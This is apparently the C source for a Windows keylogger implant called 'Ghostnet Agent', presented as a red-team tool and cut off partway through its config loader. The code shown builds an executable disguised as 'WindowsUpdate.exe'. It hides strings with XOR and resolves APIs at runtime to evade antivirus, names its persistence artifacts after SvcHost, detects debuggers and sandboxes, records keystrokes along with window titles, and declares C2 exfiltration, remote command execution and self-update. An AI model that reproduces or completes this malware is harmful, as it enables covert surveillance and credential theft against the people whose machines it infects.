/*
 * Ghostnet Agent — Windows Keylogger Implant (C)
 *
 * Single-file red-team keylogger. Compile with MinGW-w64:
 *   gcc agent_build.c -o WindowsUpdate.exe -mwindows -lkernel32 -luser32 -O2 -s
 *
 * Run: agent.exe (reads config from same directory)
 *
 * NOTE: This is the readable source. Build produces agent_build.c
 * with encrypted strings + dynamic API resolution via encrypt_strings.py.
 */

/* ============================================================================
 * SECTION 1: INCLUDES & DEFINES
 * ============================================================================ */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0600        /* Windows Vista+ */

#include <windows.h>
#include <winhttp.h>
#include <psapi.h>
#include <shlobj.h>
#include <winsock2.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>

/* ---------- constants ---------- */

#define BUFFER_SIZE         4096
#define MAX_URL_LEN         512
#define MAX_HOST_LEN        256
#define MAX_PATH_LEN        512
#define MAX_KEY_CHAR        8
#define MAX_WINDOW_TITLE    256
#define MAX_PROCESS_NAME    64
#define MAX_BLACKLIST       32
#define MAX_BLACKLIST_STRLEN 128
#define MAX_JSON_BODY       65536
#define MAX_CONFIG_FILE     8192
#define LOG_MAX_SIZE        (1024 * 1024)
#define AGENT_ID_LEN        64
#define MAX_HEADERS_LEN     256

/* timer IDs for the hidden message window */
#define TIMER_EXFIL         1
#define TIMER_HEARTBEAT     2
#define TIMER_CONFIG_POLL   3
#define TIMER_REPAIR        4

/* repair interval — check persistence health every 15 min */
#define REPAIR_INTERVAL_MS  (15 * 60 * 1000)

/* update download buffer — max binary size we accept */
#define UPDATE_MAX_SIZE     (4 * 1024 * 1024)   /* 4 MB */

/* remote command execution limits */
#define MAX_COMMAND_LEN     4096
#define MAX_OUTPUT_SIZE     65536
#define CMD_TIMEOUT_MS      30000

/* ---------- defines missing from some MinGW headers ---------- */

#ifndef NI_MAXHOST
#define NI_MAXHOST 1025
#endif

/* ============================================================================
 * SECTION 1b: ENCRYPTED STRING STORAGE
 *
 * Every sensitive string is stored XOR-encrypted with a per-build random key.
 * The key itself lives in the .rdata section (never in a named variable).
 * decrypt() and decrypt_w() are the sole accessors.
 * ============================================================================ */

/* We embed the XOR key as a static const — it will sit in .rdata.
 * The encryptor script randomizes this value per build. */
static const unsigned char __xor_key = 0x00; /* placeholder — replaced by build script */

/* Ring of 4 static buffers so multiple decrypt() calls in one expression survive */
static char  __dbuf0[8192], __dbuf1[8192], __dbuf2[8192], __dbuf3[8192];
static int   __dring = 0;
static wchar_t __wbuf[2048];

static char* decrypt(const unsigned char *enc, int len) {
    char *buf;
    switch (__dring & 3) {
        case 0: buf = __dbuf0; break;
        case 1: buf = __dbuf1; break;
        case 2: buf = __dbuf2; break;
        default: buf = __dbuf3; break;
    }
    __dring++;
    int i;
    for (i = 0; i < len && i < 8191; i++)
        buf[i] = enc[i] ^ __xor_key;
    buf[i] = '\0';
    return buf;
}

static wchar_t* decrypt_w(const unsigned char *enc, int len) {
    char tmp[2048];
    int i;
    for (i = 0; i < len && i < 2047; i++)
        tmp[i] = enc[i] ^ __xor_key;
    tmp[i] = '\0';
    MultiByteToWideChar(CP_ACP, 0, tmp, -1, __wbuf, 2048);
    return __wbuf;
}

/* ============================================================================
 * SECTION 1c: DYNAMIC API RESOLUTION
 *
 * Every suspicious WinAPI function is resolved at runtime via LoadLibrary +
 * GetProcAddress. The DLL and function names are stored encrypted above.
 * Only kernel32.dll is loaded statically (it provides LoadLibrary +
 * GetProcAddress). This keeps the IAT clean — no SetWindowsHookEx,
 * WinHttpSendRequest, RegSetValueEx, etc. in the import table.
 * ============================================================================ */

/* --- winhttp.dll (C2 communication) --- */
static HMODULE g_hWinHttp = NULL;
typedef HINTERNET (WINAPI *PFN_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *PFN_WinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *PFN_WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL     (WINAPI *PFN_WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL     (WINAPI *PFN_WinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL     (WINAPI *PFN_WinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL     (WINAPI *PFN_WinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL     (WINAPI *PFN_WinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL     (WINAPI *PFN_WinHttpCloseHandle)(HINTERNET);

static PFN_WinHttpOpen            pWinHttpOpen = NULL;
static PFN_WinHttpConnect         pWinHttpConnect = NULL;
static PFN_WinHttpOpenRequest     pWinHttpOpenRequest = NULL;
static PFN_WinHttpSendRequest     pWinHttpSendRequest = NULL;
static PFN_WinHttpReceiveResponse pWinHttpReceiveResponse = NULL;
static PFN_WinHttpQueryDataAvailable pWinHttpQueryDataAvailable = NULL;
static PFN_WinHttpReadData        pWinHttpReadData = NULL;
static PFN_WinHttpSetOption       pWinHttpSetOption = NULL;
static PFN_WinHttpCloseHandle     pWinHttpCloseHandle = NULL;

/* --- user32.dll (keyboard hook + hidden window) --- */
static HMODULE g_hUser32 = NULL;
typedef HHOOK    (WINAPI *PFN_SetWindowsHookExA)(int, HOOKPROC, HINSTANCE, DWORD);
typedef LRESULT  (WINAPI *PFN_CallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
typedef BOOL     (WINAPI *PFN_UnhookWindowsHookEx)(HHOOK);
typedef BOOL     (WINAPI *PFN_GetMessageA)(LPMSG, HWND, UINT, UINT);
typedef LRESULT  (WINAPI *PFN_DispatchMessageA)(const MSG*);
typedef BOOL     (WINAPI *PFN_TranslateMessage)(const MSG*);
typedef HWND     (WINAPI *PFN_GetForegroundWindow)(void);
typedef int      (WINAPI *PFN_GetWindowTextA)(HWND, LPSTR, int);
typedef DWORD    (WINAPI *PFN_GetWindowThreadProcessId)(HWND, LPDWORD);
typedef SHORT    (WINAPI *PFN_GetKeyState)(int);
typedef int      (WINAPI *PFN_ToUnicode)(UINT, UINT, const BYTE*, LPWSTR, int, UINT);
typedef ATOM     (WINAPI *PFN_RegisterClassExW)(const WNDCLASSEXW*);
typedef HWND     (WINAPI *PFN_CreateWindowExW)(DWORD, LPCWSTR, LPCWSTR, DWORD, int, int, int, int, HWND, HMENU, HINSTANCE, LPVOID);
typedef LRESULT  (WINAPI *PFN_DefWindowProcA)(HWND, UINT, WPARAM, LPARAM);
typedef BOOL     (WINAPI *PFN_DestroyWindow)(HWND);
typedef BOOL     (WINAPI *PFN_KillTimer)(HWND, UINT_PTR);
typedef UINT_PTR (WINAPI *PFN_SetTimer)(HWND, UINT_PTR, UINT, TIMERPROC);
typedef void     (WINAPI *PFN_PostQuitMessage)(int);

static PFN_SetWindowsHookExA    pSetWindowsHookExA = NULL;
static PFN_CallNextHookEx       pCallNextHookEx = NULL;
static PFN_UnhookWindowsHookEx  pUnhookWindowsHookEx = NULL;
static PFN_GetMessageA          pGetMessageA = NULL;
static PFN_DispatchMessageA     pDispatchMessageA = NULL;
static PFN_TranslateMessage     pTranslateMessage = NULL;
static PFN_GetForegroundWindow  pGetForegroundWindow = NULL;
static PFN_GetWindowTextA       pGetWindowTextA = NULL;
static PFN_GetWindowThreadProcessId pGetWindowThreadProcessId = NULL;
static PFN_GetKeyState          pGetKeyState = NULL;
static PFN_ToUnicode            pToUnicode = NULL;
static PFN_RegisterClassExW     pRegisterClassExW = NULL;
static PFN_CreateWindowExW      pCreateWindowExW = NULL;
static PFN_DefWindowProcA       pDefWindowProcA = NULL;
static PFN_DestroyWindow        pDestroyWindow = NULL;
static PFN_KillTimer            pKillTimer = NULL;
static PFN_SetTimer             pSetTimer = NULL;
static PFN_PostQuitMessage      pPostQuitMessage = NULL;

/* --- advapi32.dll (registry + crypto) --- */
static HMODULE g_hAdvapi32 = NULL;
typedef LONG     (WINAPI *PFN_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG     (WINAPI *PFN_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG     (WINAPI *PFN_RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG     (WINAPI *PFN_RegDeleteValueA)(HKEY, LPCSTR);
typedef LONG     (WINAPI *PFN_RegCloseKey)(HKEY);
typedef BOOL     (WINAPI *PFN_CryptAcquireContextW)(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD);
typedef BOOL     (WINAPI *PFN_CryptCreateHash)(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
typedef BOOL     (WINAPI *PFN_CryptHashData)(HCRYPTHASH, const BYTE*, DWORD, DWORD);
typedef BOOL     (WINAPI *PFN_CryptGetHashParam)(HCRYPTHASH, DWORD, BYTE*, DWORD*, DWORD);
typedef BOOL     (WINAPI *PFN_CryptDestroyHash)(HCRYPTHASH);
typedef BOOL     (WINAPI *PFN_CryptReleaseContext)(HCRYPTPROV, DWORD);
typedef BOOL     (WINAPI *PFN_CheckRemoteDebuggerPresent)(HANDLE, PBOOL);

static PFN_RegOpenKeyExA             pRegOpenKeyExA = NULL;
static PFN_RegQueryValueExA          pRegQueryValueExA = NULL;
static PFN_RegSetValueExA            pRegSetValueExA = NULL;
static PFN_RegDeleteValueA           pRegDeleteValueA = NULL;
static PFN_RegCloseKey               pRegCloseKey = NULL;
static PFN_CryptAcquireContextW      pCryptAcquireContextW = NULL;
static PFN_CryptCreateHash           pCryptCreateHash = NULL;
static PFN_CryptHashData             pCryptHashData = NULL;
static PFN_CryptGetHashParam         pCryptGetHashParam = NULL;
static PFN_CryptDestroyHash          pCryptDestroyHash = NULL;
static PFN_CryptReleaseContext       pCryptReleaseContext = NULL;
static PFN_CheckRemoteDebuggerPresent pCheckRemoteDebuggerPresent = NULL;

/* --- shell32.dll --- */
static HMODULE g_hShell32 = NULL;
typedef HRESULT (WINAPI *PFN_SHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
static PFN_SHGetFolderPathA pSHGetFolderPathA = NULL;

/* --- psapi.dll --- */
static HMODULE g_hPsapi = NULL;
typedef DWORD (WINAPI *PFN_GetModuleBaseNameA)(HANDLE, HMODULE, LPSTR, DWORD);
static PFN_GetModuleBaseNameA pGetModuleBaseNameA = NULL;

/* --- ws2_32.dll --- */
static HMODULE g_hWs2_32 = NULL;
typedef struct hostent* (WSAAPI *PFN_gethostbyname)(const char*);
typedef int             (WSAAPI *PFN_gethostname)(char*, int);
typedef char*           (WSAAPI *PFN_inet_ntoa)(struct in_addr);
typedef int             (WSAAPI *PFN_WSAStartup)(WORD, LPWSADATA);
static PFN_gethostbyname p_gethostbyname = NULL;
static PFN_gethostname   p_gethostname = NULL;
static PFN_inet_ntoa     p_inet_ntoa = NULL;
static PFN_WSAStartup    p_WSAStartup = NULL;

/* --- kernel32 (already loaded, but resolve what we need dynamically) --- */
typedef BOOL   (WINAPI *PFN_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *PFN_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
static PFN_CreateProcessA pCreateProcessA = NULL;
static PFN_CreatePipe     pCreatePipe = NULL;

/* ── global version string (encrypted) ── */
static const unsigned char __enc_version[] = {
    0x00,0x00,0x00,0x00,0x00  /* placeholder — replaced by build script */
};
#define AGENT_VERSION_STR  "1.0.4"  /* parsed by encryptor — do not move */
#define AGENT_VERSION decrypt(__enc_version, 5)

/* ── compiled-in C2 URL fallback (encrypted) ── */
static const unsigned char __enc_default_c2_url[] = {
    0x00  /* placeholder — replaced by build script */
};

/* ── persistence identifiers — generated at runtime, stored here ── */
static wchar_t g_mutex_name[64];
static char    g_task_name[64];
static char    g_reg_value_name[64];

/* ── forward declarations ── */
static void c2_update(const char *url, const char *expected_sha256);
static void c2_config_poll(void);
static int  c2_exec_command(const char *command_id, const char *command);
static DWORD WINAPI c2_exec_command_thread(LPVOID param);
static void persistence_paths(char *original_exe, int orig_size,
                               char *persist_dir, int dir_size,
                               char *persist_exe, int exe_size,
                               char *persist_config, int cfg_size);
static void persistence_uninstall(void);
static void gen_persistence_names(void);
static int  api_init(void);

/* ============================================================================
 * SECTION 1d: PERSISTENCE NAME GENERATOR
 *
 * Generates per-machine stable identifiers based on volume serial + hostname.
 * Replaces the old hardcoded "WindowsUpdate" strings that Defender knows.
 * Names are unique per machine but stable across reboots.
 * ============================================================================ */

static void gen_persistence_names(void) {
    char hostname[256] = {0};
    DWORD sz = sizeof(hostname);
    GetComputerNameA(hostname, &sz);

    DWORD serial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);

    /* Build a machine fingerprint */
    unsigned long hash = 5381;
    char fingerprint[320];
    snprintf(fingerprint, sizeof(fingerprint), "%08lx-%s", serial, hostname);
    for (char *p = fingerprint; *p; p++)
        hash = ((hash << 5) + hash) + (unsigned char)*p;  /* djb2 */

    /* Generate stable-but-unique names */
    swprintf(g_mutex_name, 64, L"Local\\SvcHost_%08lx", hash);
    snprintf(g_task_name, 64, "SvcHostTask_%08lx", hash);
    snprintf(g_reg_value_name, 64, "SvcHost_%08lx", hash);
}

/* ============================================================================
 * SECTION 1e: API INITIALIZATION
 *
 * Called once at startup. Loads every needed DLL and resolves every function
 * pointer. Returns 0 on failure, 1 on success.
 * ============================================================================ */

static int api_init(void) {
    /* --- winhttp.dll --- */
    g_hWinHttp = LoadLibraryA("winhttp.dll");
    if (!g_hWinHttp) return 0;
    pWinHttpOpen = (PFN_WinHttpOpen)GetProcAddress(g_hWinHttp, "WinHttpOpen");
    pWinHttpConnect = (PFN_WinHttpConnect)GetProcAddress(g_hWinHttp, "WinHttpConnect");
    pWinHttpOpenRequest = (PFN_WinHttpOpenRequest)GetProcAddress(g_hWinHttp, "WinHttpOpenRequest");
    pWinHttpSendRequest = (PFN_WinHttpSendRequest)GetProcAddress(g_hWinHttp, "WinHttpSendRequest");
    pWinHttpReceiveResponse = (PFN_WinHttpReceiveResponse)GetProcAddress(g_hWinHttp, "WinHttpReceiveResponse");
    pWinHttpQueryDataAvailable = (PFN_WinHttpQueryDataAvailable)GetProcAddress(g_hWinHttp, "WinHttpQueryDataAvailable");
    pWinHttpReadData = (PFN_WinHttpReadData)GetProcAddress(g_hWinHttp, "WinHttpReadData");
    pWinHttpSetOption = (PFN_WinHttpSetOption)GetProcAddress(g_hWinHttp, "WinHttpSetOption");
    pWinHttpCloseHandle = (PFN_WinHttpCloseHandle)GetProcAddress(g_hWinHttp, "WinHttpCloseHandle");

    /* --- user32.dll --- */
    g_hUser32 = LoadLibraryA("user32.dll");
    if (!g_hUser32) return 0;
    pSetWindowsHookExA = (PFN_SetWindowsHookExA)GetProcAddress(g_hUser32, "SetWindowsHookExA");
    pCallNextHookEx = (PFN_CallNextHookEx)GetProcAddress(g_hUser32, "CallNextHookEx");
    pUnhookWindowsHookEx = (PFN_UnhookWindowsHookEx)GetProcAddress(g_hUser32, "UnhookWindowsHookEx");
    pGetMessageA = (PFN_GetMessageA)GetProcAddress(g_hUser32, "GetMessageA");
    pDispatchMessageA = (PFN_DispatchMessageA)GetProcAddress(g_hUser32, "DispatchMessageA");
    pTranslateMessage = (PFN_TranslateMessage)GetProcAddress(g_hUser32, "TranslateMessage");
    pGetForegroundWindow = (PFN_GetForegroundWindow)GetProcAddress(g_hUser32, "GetForegroundWindow");
    pGetWindowTextA = (PFN_GetWindowTextA)GetProcAddress(g_hUser32, "GetWindowTextA");
    pGetWindowThreadProcessId = (PFN_GetWindowThreadProcessId)GetProcAddress(g_hUser32, "GetWindowThreadProcessId");
    pGetKeyState = (PFN_GetKeyState)GetProcAddress(g_hUser32, "GetKeyState");
    pToUnicode = (PFN_ToUnicode)GetProcAddress(g_hUser32, "ToUnicode");
    pRegisterClassExW = (PFN_RegisterClassExW)GetProcAddress(g_hUser32, "RegisterClassExW");
    pCreateWindowExW = (PFN_CreateWindowExW)GetProcAddress(g_hUser32, "CreateWindowExW");
    pDefWindowProcA = (PFN_DefWindowProcA)GetProcAddress(g_hUser32, "DefWindowProcA");
    pDestroyWindow = (PFN_DestroyWindow)GetProcAddress(g_hUser32, "DestroyWindow");
    pKillTimer = (PFN_KillTimer)GetProcAddress(g_hUser32, "KillTimer");
    pSetTimer = (PFN_SetTimer)GetProcAddress(g_hUser32, "SetTimer");
    pPostQuitMessage = (PFN_PostQuitMessage)GetProcAddress(g_hUser32, "PostQuitMessage");

    /* --- advapi32.dll --- */
    g_hAdvapi32 = LoadLibraryA("advapi32.dll");
    if (!g_hAdvapi32) return 0;
    pRegOpenKeyExA = (PFN_RegOpenKeyExA)GetProcAddress(g_hAdvapi32, "RegOpenKeyExA");
    pRegQueryValueExA = (PFN_RegQueryValueExA)GetProcAddress(g_hAdvapi32, "RegQueryValueExA");
    pRegSetValueExA = (PFN_RegSetValueExA)GetProcAddress(g_hAdvapi32, "RegSetValueExA");
    pRegDeleteValueA = (PFN_RegDeleteValueA)GetProcAddress(g_hAdvapi32, "RegDeleteValueA");
    pRegCloseKey = (PFN_RegCloseKey)GetProcAddress(g_hAdvapi32, "RegCloseKey");
    pCryptAcquireContextW = (PFN_CryptAcquireContextW)GetProcAddress(g_hAdvapi32, "CryptAcquireContextW");
    pCryptCreateHash = (PFN_CryptCreateHash)GetProcAddress(g_hAdvapi32, "CryptCreateHash");
    pCryptHashData = (PFN_CryptHashData)GetProcAddress(g_hAdvapi32, "CryptHashData");
    pCryptGetHashParam = (PFN_CryptGetHashParam)GetProcAddress(g_hAdvapi32, "CryptGetHashParam");
    pCryptDestroyHash = (PFN_CryptDestroyHash)GetProcAddress(g_hAdvapi32, "CryptDestroyHash");
    pCryptReleaseContext = (PFN_CryptReleaseContext)GetProcAddress(g_hAdvapi32, "CryptReleaseContext");
    pCheckRemoteDebuggerPresent = (PFN_CheckRemoteDebuggerPresent)GetProcAddress(g_hAdvapi32, "CheckRemoteDebuggerPresent");

    /* --- shell32.dll --- */
    g_hShell32 = LoadLibraryA("shell32.dll");
    if (g_hShell32)
        pSHGetFolderPathA = (PFN_SHGetFolderPathA)GetProcAddress(g_hShell32, "SHGetFolderPathA");

    /* --- psapi.dll --- */
    g_hPsapi = LoadLibraryA("psapi.dll");
    if (g_hPsapi)
        pGetModuleBaseNameA = (PFN_GetModuleBaseNameA)GetProcAddress(g_hPsapi, "GetModuleBaseNameA");

    /* --- ws2_32.dll --- */
    g_hWs2_32 = LoadLibraryA("ws2_32.dll");
    if (g_hWs2_32) {
        p_WSAStartup = (PFN_WSAStartup)GetProcAddress(g_hWs2_32, "WSAStartup");
        if (p_WSAStartup) {
            WSADATA wsa;
            p_WSAStartup(0x0202, &wsa);
        }
        p_gethostbyname = (PFN_gethostbyname)GetProcAddress(g_hWs2_32, "gethostbyname");
        p_gethostname = (PFN_gethostname)GetProcAddress(g_hWs2_32, "gethostname");
        p_inet_ntoa = (PFN_inet_ntoa)GetProcAddress(g_hWs2_32, "inet_ntoa");
    }

    /* --- kernel32 (already loaded, just resolve extras) --- */
    {
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (hKernel32) {
            pCreateProcessA = (PFN_CreateProcessA)GetProcAddress(hKernel32, "CreateProcessA");
            pCreatePipe     = (PFN_CreatePipe)GetProcAddress(hKernel32, "CreatePipe");
        }
    }

    return 1; /* all critical DLLs loaded */
}

/* ============================================================================
 * SECTION 2: DATA STRUCTURES
 * ============================================================================ */

/* a single captured keystroke event */
typedef struct {
    FILETIME timestamp;               /* UTC timestamp */
    DWORD    vk_code;
    WCHAR    character;
    char     window_title[MAX_WINDOW_TITLE];
    char     process_name[MAX_PROCESS_NAME];
    DWORD    process_id;
    DWORD    flags;
} KeyEvent;

/* ring buffer for captured keystrokes */
static KeyEvent      g_keystroke_buffer[BUFFER_SIZE];
static volatile LONG g_buffer_head  = 0;   /* next write position */
static volatile LONG g_buffer_count = 0;   /* number of pending events */
static CRITICAL_SECTION g_buffer_cs;

/* agent runtime state */
static char    g_agent_id[AGENT_ID_LEN] = {0};
static char    g_c2_url[MAX_URL_LEN]    = {0};
static int     g_c2_port                = 443;
static int     g_use_https              = 1;
static char    g_c2_host[MAX_HOST_LEN]  = {0};
static int     g_exfil_interval_sec     = 30;
static int     g_heartbeat_interval_sec = 60;
static int     g_config_poll_interval_sec = 300;
static int     g_encrypt_payload        = 0;
static int     g_agent_registered       = 0;

/* blacklist */
static char    g_blacklist[MAX_BLACKLIST][MAX_BLACKLIST_STRLEN];
static int     g_blacklist_count = 0;

/* hidden message window handle — set in WinMain, used by c2_config_poll to re-arm timers */
static HWND g_hwnd = NULL;

/* heartbeat counter */
static volatile LONG g_keys_since_heartbeat = 0;
static DWORD   g_startup_ticks = 0;

/* ============================================================================
 * SECTION 3: LOGGING
 * ============================================================================ */

static char g_log_path[MAX_PATH] = {0};

static void log_init(void) {
    char appdata[MAX_PATH];
    if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
        snprintf(g_log_path, MAX_PATH, "%s\\Microsoft\\Crypto", appdata);
        CreateDirectoryA(g_log_path, NULL);
        snprintf(g_log_path, MAX_PATH, "%s\\Microsoft\\Crypto\\debug.log", appdata);
    }
}

static void log_write(const char *msg) {
    if (g_log_path[0] == 0) return;

    /* rotate if too large */
    HANDLE hf = CreateFileA(g_log_path, GENERIC_READ, 0, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD sz = GetFileSize(hf, NULL);
        CloseHandle(hf);
        if (sz > LOG_MAX_SIZE) {
            char old_path[MAX_PATH];
            snprintf(old_path, MAX_PATH, "%s.old", g_log_path);
            DeleteFileA(old_path);
            MoveFileA(g_log_path, old_path);
        }
    }

    hf = CreateFileA(g_log_path, FILE_APPEND_DATA, 0, NULL,
                     OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;

    SYSTEMTIME st;
    GetSystemTime(&st);
    char line[1024];
    int len = snprintf(line, sizeof(line),
                       "[%04d-%02d-%02d %02d:%02d:%02d.%03d] %s\r\n",
                       st.wYear, st.wMonth, st.wDay,
                       st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
                       msg);
    DWORD written;
    WriteFile(hf, line, len, &written, NULL);
    CloseHandle(hf);
}

/* ============================================================================
 * SECTION 4: STEALTH CHECKS
 * ============================================================================ */

static int stealth_check_debugger(void) {
    if (IsDebuggerPresent()) return 1;
    BOOL remote = FALSE;
    pCheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    return remote ? 1 : 0;
}

static int stealth_check_sandbox(void) {
    /* RAM check — less than 2GB suggests VM/sandbox */
    MEMORYSTATUSEX mem = {0};
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return 1;

    /* Disk check — less than 60GB total suggests sandbox */
    ULARGE_INTEGER totalBytes;
    if (GetDiskFreeSpaceExA("C:\\", NULL, &totalBytes, NULL)) {
        if (totalBytes.QuadPart < 35ULL * 1024 * 1024 * 1024) return 1;
    }

    /* CPU cores — less than 2 suggests sandbox */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 1;

    return 0;
}

/* ============================================================================
 * SECTION 5: UTILITY HELPERS
 * ============================================================================ */

/* case-insensitive strstr */
static const char* stristr(const char *haystack, const char *needle) {
    if (!*needle) return haystack;
    for (; *haystack; haystack++) {
        const char *h = haystack, *n = needle;
        while (*h && *n && (tolower((unsigned char)*h) == tolower((unsigned char)*n))) {
            h++; n++;
        }
        if (!*n) return haystack;
    }
    return NULL;
}

/* case-insensitive compare */
static int stricmp_local(const char *a, const char *b) {
    while (*a && *b) {
        int diff = tolower((unsigned char)*a) - tolower((unsigned char)*b);
        if (diff) return diff;
        a++; b++;
    }
    return (unsigned char)*a - (unsigned char)*b;
}

static char* str_trim(char *s) {
    while (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n') s++;
    char *end = s + strlen(s) - 1;
    while (end > s && (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n')) {
        *end = '\0';
        end--;
    }
    return s;
}

/*
 * Minimal JSON helpers — just enough to parse our flat config file.
 * Returns extracted value from string key.
 */
static int json_extract_string(const char *json, const char *key,
                               char *out, int out_size) {
    char search[256];
    snprintf(search, sizeof(search), "\"%s\"", key);
    int search_len = (int)strlen(search);

    /* loop to handle substring collisions (e.g. "key" matching "key_prefix") */
    const char *json_end = json + strlen(json);
    const char *scan = json;
    while (scan < json_end) {
        const char *pos = strstr(scan, search);
        if (!pos) return 0;

        /* check char after the closing quote — must be ':' or whitespace then ':' */
        const char *after_key = pos + search_len;
        while (after_key < json_end &&
               (*after_key == ' ' || *after_key == '\t' ||
                *after_key == '\r' || *after_key == '\n'))
            after_key++;
        if (after_key < json_end && *after_key == ':') {
            /* found exact match — extract the value */
            pos = after_key + 1;
            while (*pos == ' ' || *pos == '\t' || *pos == '\r' || *pos == '\n') pos++;
            if (*pos != '"') return 0;
            pos++;
            const char *end = strchr(pos, '"');
            if (!end) return 0;
            int len = (int)(end - pos);
            if (len >= out_size) len = out_size - 1;
            memcpy(out, pos, len);
            out[len] = '\0';
            return 1;
        }

        /* false match — continue search after this occurrence */
        scan = pos + 1;
    }
    return 0;
}

static int json_extract_int(const char *json, const char *key, int *out) {
    char buf[32];
    if (!json_extract_string(json, key, buf, sizeof(buf))) {
        /* try as raw number — loop to avoid substring collisions */
        char search[256];
        int search_len;
        snprintf(search, sizeof(search), "\"%s\"", key);
        search_len = (int)strlen(search);
        const char *json_end = json + strlen(json);
        const char *scan = json;
        while (scan < json_end) {
            const char *pos = strstr(scan, search);
            if (!pos) return 0;
            const char *after = pos + search_len;
            while (after < json_end &&
                   (*after == ' ' || *after == '\t' || *after == '\r' || *after == '\n'))
                after++;
            if (after < json_end && *after == ':') {
                after++;
                while (*after == ' ' || *after == '\t' || *after == '\r' || *after == '\n')
                    after++;
                *out = atoi(after);
                return 1;
            }
            scan = pos + 1;
        }
        return 0;
    }
    *out = atoi(buf);
    return 1;
}

static int json_extract_bool(const char *json, const char *key, int *out) {
    char buf[16];
    if (!json_extract_string(json, key, buf, sizeof(buf))) {
        /* try as raw literal — loop to avoid substring collisions */
        char search[256];
        int search_len;
        snprintf(search, sizeof(search), "\"%s\"", key);
        search_len = (int)strlen(search);
        const char *json_end = json + strlen(json);
        const char *scan = json;
        while (scan < json_end) {
            const char *pos = strstr(scan, search);
            if (!pos) return 0;
            const char *after = pos + search_len;
            while (after < json_end &&
                   (*after == ' ' || *after == '\t' || *after == '\r' || *after == '\n'))
                after++;
            if (after < json_end && *after == ':') {
                after++;
                while (*after == ' ' || *after == '\t' || *after == '\r' || *after == '\n')
                    after++;
                if (strncmp(after, "true", 4) == 0) { *out = 1; return 1; }
                if (strncmp(after, "false", 5) == 0) { *out = 0; return 1; }
                return 0;
            }
            scan = pos + 1;
        }
        return 0;
    }
    *out = (stricmp_local(buf, "true") == 0) ? 1 : 0;
    return 1;
}

/* extract first array entry from JSON array ["a","b"] — returns "" when done */
static const char* json_array_next(const char *json, const char *key,
                                   char *out, int out_size) {
    char search[256];
    snprintf(search, sizeof(search), "\"%s\"", key);
    const char *pos = strstr(json, search);
    if (!pos) return NULL;
    pos += strlen(search);
    while (*pos == ' ' || *pos == '\t' || *pos == '\r' || *pos == '\n') pos++;
    if (*pos != ':') return NULL;
    pos++;
    while (*pos == ' ' || *pos == '\t' || *pos == '\r' || *pos == '\n') pos++;
    if (*pos != '[') return NULL;
    return pos + 1;     /* return pointer inside array */
}

static const char* json_array_get_next(const char *arr_pos, char *out, int out_size) {
    while (*arr_pos == ' ' || *arr_pos == '\t' || *arr_pos == '\r' ||
           *arr_pos == '\n' || *arr_pos == ',') arr_pos++;
    if (*arr_pos == ']' || *arr_pos == '\0') return NULL;
    if (*arr_pos != '"') return NULL;
    arr_pos++;
    const char *end = strchr(arr_pos, '"');
    if (!end) return NULL;
    int len = (int)(end - arr_pos);
    if (len >= out_size) len = out_size - 1;
    memcpy(out, arr_pos, len);
    out[len] = '\0';
    return end + 1;
}

static int config_load(const char *filepath) {
    HANDLE hf = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        log_write("config: cannot open config file, using defaults");
        return 0;
    }

    DWORD size = GetFileSize(hf, NULL);
    if (size == INVALID_FILE_SIZE || size > MAX_CONFIG_FILE) {
        CloseHandle(hf);
        return 0;
    }

    char *buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 1);
    if (!buf) { CloseHandle(hf); return 0; }

    DWORD read;
    ReadFile(hf, buf, size, &read, NULL);
    CloseHandle(hf);
    buf[read] = '\0';

    json_extract_string(buf, "c2_url", g_c2_url, MAX_URL_LEN);
    json_extract_int(buf, "c2_port", &g_c2_port);
